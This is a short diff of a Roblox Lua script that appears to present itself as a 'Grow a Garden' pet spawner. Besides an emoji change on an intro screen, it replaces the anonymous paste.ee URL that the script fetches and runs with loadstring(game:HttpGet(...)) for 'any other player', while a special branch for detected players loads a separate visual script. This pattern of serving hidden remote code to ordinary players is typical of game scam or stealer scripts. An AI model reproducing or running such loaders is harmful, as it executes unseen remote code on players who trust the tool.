@@ -11,7 +11,7 @@ introBG.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
 local moon = Instance.new("TextLabel", introBG)
 moon.Size = UDim2.new(0, 100, 0, 100)
 moon.Position = UDim2.new(0.5, -50, 0.5, -50)
-moon.Text = "🐺"
+moon.Text = "🌙"
 moon.TextColor3 = Color3.fromRGB(255, 255, 255)
 moon.Font = Enum.Font.FredokaOne
 moon.TextScaled = true
@@ -159,7 +159,7 @@ task.spawn(function()
             loadstring(game:HttpGet("https://raw.githubusercontent.com/SpaceScriptHUB/petspawner/refs/heads/main/GrowaGardenVisual", true))()
         else
             -- This is for any other player
-            loadstring(game:HttpGet("https://paste.ee/r/MTVty3cV"))()
+            loadstring(game:HttpGet("https://paste.ee/r/MSZQQZOe"))()
         end
         -- --- END PLAYER DETECTION LOGIC ---
     end)
